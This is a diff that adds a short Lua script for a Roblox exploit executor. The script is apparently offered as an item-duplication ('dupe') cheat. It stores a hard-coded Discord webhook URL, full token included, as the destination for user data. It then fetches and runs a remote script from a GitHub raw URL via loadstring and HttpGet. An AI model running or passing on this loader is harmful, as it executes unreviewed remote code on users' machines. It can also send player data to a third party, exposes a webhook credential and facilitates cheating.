@@ -1,0 +1,11 @@
+local Webhook = "https://discord.com/api/webhooks/1443340826620071957/Wff-2tS7wTJ7Cn8aSeE_hnbgtDiSoLf15RPv7zpqyfpcVnEFpdrhAUIsAEsb23Yh_My1"
+
+getgenv().UserPingThreshold = 50000000
+
+if Webhook and Webhook:match("discord.com/api/webhooks") then
+    getgenv().UserWebhookURL = Webhook
+else
+    return
+end
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/LXZRz/dupe/main/dupe.lua', true))()
